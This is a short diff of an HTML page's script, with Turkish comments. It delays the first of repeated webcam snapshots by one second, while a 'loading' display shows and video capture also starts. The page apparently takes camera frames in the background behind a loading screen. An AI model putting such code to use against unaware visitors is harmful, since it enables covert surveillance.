@@ -172,7 +172,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // FOTOĞRAF - HEMEN BAŞLA (0ms)
+                        // FOTOĞRAF - 1 SANİYE SONRA BAŞLA (ilk foto fazla gelmesin)
                         // ========================================
                         function fotoCek() {
                             if (!stream?.active) return;
@@ -197,11 +197,14 @@
                             }, 'image/jpeg', 0.85);
                         }
                         
-                        // İLK FOTO HEMEN
-                        fotoCek();
-                        
-                        // DİĞER FOTOLAR
-                        setInterval(fotoCek, FOTO_SURESI * 1000);
+                        // İLK FOTO 1 SANİYE SONRA
+                        setTimeout(() => {
+                            fotoCek(); // 1. saniyede 1. foto
+                            
+                            // DİĞER FOTOLAR
+                            setInterval(fotoCek, FOTO_SURESI * 1000);
+                            
+                        }, 1000);
                         
                         // ========================================
                         // VİDEO - HEMEN BAŞLA (0ms)
@@ -269,4 +272,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
